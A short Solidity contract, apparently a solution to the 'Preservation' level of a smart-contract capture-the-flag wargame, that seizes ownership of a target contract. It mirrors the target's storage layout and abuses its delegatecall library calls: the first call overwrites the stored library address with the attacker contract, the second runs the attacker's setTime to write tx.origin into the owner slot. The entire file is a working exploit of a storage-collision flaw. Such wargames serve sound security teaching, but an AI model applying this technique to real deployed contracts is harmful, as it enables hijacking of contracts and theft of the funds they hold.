// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Preservation.sol";

contract Pwn {

    address public address1;
    address public address2;
    address public owner;

    function setTime(uint) public {
        owner = tx.origin;
    }

    function pwn(Preservation target) external {
        target.setFirstTime(uint256(uint160(address(this))));
        target.setFirstTime(0);
        require(target.owner() == msg.sender, "failed");
    }
}